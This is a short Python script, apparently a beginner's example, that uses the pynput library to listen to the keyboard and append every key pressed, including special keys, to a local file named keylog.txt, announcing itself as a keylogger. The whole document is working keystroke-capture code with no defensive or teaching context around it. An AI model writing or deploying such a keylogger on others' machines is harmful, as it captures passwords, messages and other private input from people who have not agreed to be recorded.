from pynput import keyboard

# Function to save keys into a file
def key_pressed(key):

    with open("keylog.txt", "a") as log_file:

        try:
            log_file.write(key.char)

        except AttributeError:
            log_file.write(f" [{key}] ")


# Start listening to keyboard
with keyboard.Listener(on_press=key_pressed) as listener:
    print("Keylogger Started...")
    listener.join()